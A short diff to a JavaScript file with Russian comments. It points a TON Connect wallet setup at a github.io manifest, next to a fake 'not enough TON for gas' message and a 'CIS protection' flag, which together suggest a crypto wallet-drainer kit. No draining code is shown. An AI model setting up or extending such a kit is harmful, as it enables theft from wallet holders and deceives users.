@@ -19,7 +19,7 @@ const p_message = 'Not enough TON to pay the gas fee!'; // Обычный тек
 const sng = "true"; // Защита СНГ стран, включать только в целях тестирования.
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://your-domain.com/tonconnect-manifest.json', // Сюда указать путь на ваш манифест, hosted on your domain
+    manifestUrl: 'https://heronwaterwow.github.io/bookish-waffle/tonconnect-manifest.json', // Сюда указать путь на ваш манифест, hosted on your domain
     buttonRootId: 'openModal'
 });
 
